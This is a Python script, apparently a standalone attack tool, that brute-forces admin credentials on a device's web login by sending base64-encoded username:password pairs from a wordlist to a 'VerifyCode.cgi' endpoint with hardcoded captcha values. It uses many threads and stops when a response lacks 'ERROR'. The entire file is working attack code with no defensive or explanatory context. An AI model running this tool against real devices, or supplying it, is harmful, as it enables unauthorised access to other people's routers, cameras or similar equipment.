import socket
import base64
import argparse
import os
from threading import Thread, Lock

lock = Lock()


def test_password(ip, port, username, password, thread_id):
    """Tests a single password for the given target."""
    try:
        credentials = f"{username}:{password.strip()}"
        encoded_credentials = base64.b64encode(credentials.encode()).decode()
        path = f"cgi-bin/nobody/VerifyCode.cgi?account={encoded_credentials}&captcha_code=6844&verify_code=685S.p/17Zkkc HTTP/1.1"

        # Create a socket
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(3)  # Timeout for connection
            sock.connect((ip, int(port)))

            # Send the request
            request = f"GET /{path} HTTP/1.1\r\nHost: {ip}\r\n\r\n"
            sock.sendall(request.encode())

            # Receive response
            response = sock.recv(1024).decode()

            # Check response for success
            if "ERROR" not in response:
                with lock:
                    print(f"\n[Success] Thread-{thread_id}: Password found! Username: '{username}', Password: '{password.strip()}'\n")
                os._exit(0)  # Terminate all threads on success
            else:
                with lock:
                    print(f"[Fail] Thread-{thread_id}: {password.strip()} is incorrect.")
    except socket.error:
        with lock:
            print(f"[Error] Thread-{thread_id}: Connection failed for {password.strip()}.")


def brute_force(ip, port, wordlist_path, username="admin", threads=10):
    """Performs brute-force attack using multithreading."""
    if not os.path.isfile(wordlist_path):
        print(f"[Error] Wordlist file '{wordlist_path}' not found.")
        return

    with open(wordlist_path, 'r') as file:
        passwords = file.readlines()

    print(f"Starting brute-force attack on {ip}:{port} using {threads} threads...\n")

    for i, password in enumerate(passwords):
        thread = Thread(target=test_password, args=(ip, port, username, password, i + 1))
        thread.start()

        # Limit the number of active threads
        if (i + 1) % threads == 0:
            thread.join()


if __name__ == "__main__":
    # Parsing command-line arguments
    parser = argparse.ArgumentParser(description="Fast Brute-force script using multithreading.")
    parser.add_argument("-H", "--host", required=True, help="Target host IP address")  # Change -h to -H
    parser.add_argument("-p", "--port", required=True, help="Target port number")
    parser.add_argument("-l", "--wordlist", required=True, help="Path to the wordlist file")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of concurrent threads (default: 10)")
    args = parser.parse_args()

    brute_force(args.host, args.port, args.wordlist, threads=args.threads)
